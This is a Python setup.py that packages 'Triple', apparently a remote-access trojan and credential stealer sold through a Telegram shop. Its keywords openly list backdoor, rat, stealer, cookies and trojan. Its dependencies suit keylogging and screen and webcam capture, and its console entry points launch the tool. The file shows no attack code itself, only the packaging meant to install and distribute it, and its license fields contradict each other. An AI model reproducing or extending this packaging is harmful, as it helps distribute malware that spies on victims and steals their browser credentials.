from setuptools import setup, find_namespace_packages

VERSION = (1, 1, 0, '', 0)

if VERSION[3] and VERSION[4]:
    VERSION_TEXT = '{0}.{1}.{2}{3}{4}'.format(*VERSION)
else:
    VERSION_TEXT = '{0}.{1}.{2}'.format(*VERSION[0:3])

VERSION_EXTRA = ''
LICENSE = 'GPL3'
EDITION = ''  # Added in package names, after the version
KEYWORDS = "malware, backdoor, python, rat, crypto, stealer, cookies, logs, browser logs, explorer, trojan"


with open("README.md", "r") as fd:
    description = fd.read()


setup(
    name='Triple',
    version=VERSION_TEXT + EDITION,
    description="Triple Server Agent",
    url="https://t.me/xryptbxshop",
    author='Oliver Walker',
    author_email='oliverwalker@xmpp.jp',
    maintainer='Oliver Walker (@oliverwalkerjp)',
    maintainer_email='oliverwalker@xmpp.jp',
    include_package_data=True,
    packages=find_namespace_packages(include=['*', '']),
    long_description=description,
    long_description_content_type='text/markdown',
    license=LICENSE,
    keywords=KEYWORDS,
    entry_points={
        'console_scripts': ['triple = triple._cmd_:main', 'triple-start = triple._cmd_:main']
    },
    install_requires=["opencv-python", "imageio", "Pillow","keyboard", "pyautogui", "rich", "pyfiglet"],

    zip_safe=False,
    classifiers=[
        'Environment :: Console',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: BSD License',
        'Topic :: Office/Business',
        'Topic :: Software Development :: Libraries :: Application Frameworks',
        'Topic :: Software Development :: Libraries :: Python Modules',
        'Operating System :: OS Independent',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Programming Language :: Python :: 3.11',
        'Programming Language :: Python :: 3.12',
        'Programming Language :: Python'
    ],
    python_requires='>3, >=3.3',
)